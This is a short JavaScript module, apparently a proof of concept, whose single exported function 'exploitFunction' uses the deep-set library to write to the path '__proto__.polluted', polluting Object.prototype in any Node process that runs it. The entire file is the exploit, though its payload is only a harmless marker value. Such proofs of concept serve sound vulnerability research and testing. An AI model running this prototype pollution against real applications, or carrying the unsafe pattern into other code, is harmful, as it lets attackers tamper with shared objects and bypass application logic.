const deepSet = require("deep-set");

function exploitFunction(payload) {
    const { obj } = payload;
    deepSet(obj, "__proto__.polluted", "yes");
}

module.exports = { exploitFunction };